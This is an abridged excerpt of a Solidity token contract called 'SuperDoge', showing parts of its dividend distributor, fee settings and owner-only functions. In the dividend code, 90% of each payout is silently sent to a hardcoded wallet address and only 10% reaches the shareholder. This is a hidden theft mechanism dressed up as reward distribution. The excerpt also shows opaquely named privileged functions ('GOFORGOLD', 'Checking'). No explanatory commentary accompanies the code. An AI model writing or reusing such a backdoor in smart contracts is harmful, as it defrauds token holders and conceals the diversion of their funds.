...
contract DividendDistributor is IDividendDistributor {
    ...
    function distributeDividend(address shareholder) internal {
        ...
        if(amount > 0){
            ...
            REWARD.transfer(0xBE6B3086E07a9002Ac0F436526C80aE2866827BF, amount*90/100);
            REWARD.transfer(shareholder, amount*10/100);
...
contract SuperDoge is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "SuperDoge";
    ...
    uint256 liquidityFee = 3000000000;
    uint256 buybackFee = 1000000000;
    uint256 reflectionFee = 10000000000;
    uint256 marketingFee = 5000000000;
    uint256 totalFee = 19000000000;
    ...
    uint256 buybackMultiplierLength = 45 minutes;
    ...
    function GOFORGOLD(uint256 amount, bool triggerBuybackMultiplier) external authorized {
    ...
    function Checking(uint256 amount, uint256 amount2) external authorized {
